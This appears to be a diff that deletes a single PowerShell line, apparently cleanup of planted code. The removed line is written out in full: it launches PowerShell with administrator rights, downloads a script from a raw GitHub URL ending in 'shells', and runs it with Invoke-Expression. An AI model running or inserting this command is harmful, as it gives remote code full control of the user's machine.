@@ -1,1 +1,0 @@
-Start-Process powershell.exe -Verb RunAs -ArgumentList "-Command `"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/SszOnTop/2z/main/shells')`""
